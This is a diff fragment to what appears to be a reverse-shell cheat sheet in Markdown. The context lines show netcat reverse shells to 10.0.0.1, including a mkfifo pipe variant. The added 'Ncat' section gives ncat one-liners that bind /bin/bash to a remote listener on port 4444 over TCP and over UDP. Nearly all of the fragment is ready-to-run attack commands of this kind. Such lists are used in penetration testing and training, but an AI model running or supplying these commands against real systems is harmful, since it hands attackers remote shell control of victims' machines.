@@ -35,6 +35,12 @@ nc -e /bin/sh 10.0.0.1 1234
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
 ```
 
+Ncat
+```bash
+ncat 127.0.0.1 4444 -e /bin/bash
+ncat --udp 127.0.0.1 4444 -e /bin/bash
+```
+
 Java
 ```java
 r = Runtime.getRuntime()
